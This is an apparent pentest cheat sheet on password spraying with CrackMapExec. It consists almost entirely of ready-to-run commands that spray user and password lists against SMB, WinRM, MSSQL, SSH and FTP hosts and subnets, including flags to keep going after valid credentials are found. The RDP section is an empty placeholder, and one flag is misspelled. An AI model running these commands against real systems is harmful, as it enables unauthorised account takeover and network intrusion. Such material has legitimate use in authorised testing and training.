# Password spraying

### SMB

{% code overflow="wrap" %}
```bash
# Multiple users and a single password
cme smb 192.168.1.101 -u user1 user2 user3 -p Summer1
cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18

# A single user and multiple passwords
cme smb 192.168.1.101 -u user1 -p password1 password2 password3
cme smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt

# multiple users and multiple passwords
cme smb 192.168.1.101 -u user.txt -p user.txt

# No brute-force nad continue spraying until the end of the files.
cme smb 192.168.1.101 -u user.txt -p password.txt --no-bruteforce --continue-on-succes

# By default CME will exit after a successful login is found. Using the --continue-on-success flag will continue spraying even after a valid password is found. Usefull for spraying a single password against a large user list.
```
{% endcode %}

### WINRM

```bash
cme winrm 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

### MSSQL

```bash
cme mssql 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

### SSH

{% code overflow="wrap" %}
```bash
cme ssh 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce

# Use hydra if you need to brute-force ssh. 
```
{% endcode %}

### FTP

```
cme ftp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

### RDP

```
// Some code
```
